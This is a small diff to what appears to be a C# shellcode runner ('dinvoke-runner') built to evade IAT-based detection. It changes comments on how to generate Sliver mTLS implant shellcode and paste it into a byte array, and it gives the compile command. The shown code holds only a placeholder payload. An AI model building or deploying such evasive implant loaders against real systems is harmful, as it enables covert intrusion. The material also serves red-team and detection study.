@@ -7,8 +7,7 @@
 // IAT-based detection of the API usage.
 //
 // Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-//   python3 ../../sliver/sliver2arrays.py /tmp/sc.bin --csharp
+//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
 //
 // Compile (Release, x64):
 //   csc /target:exe /platform:x64 /optimize+ /out:dinvoke-runner.exe dinvoke-runner.cs
@@ -49,7 +48,7 @@ namespace DInvokeRunner
 
         static void Main(string[] args)
         {
-            // ── Paste your shellcode here (from sliver2arrays.py --csharp) ─────
+            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
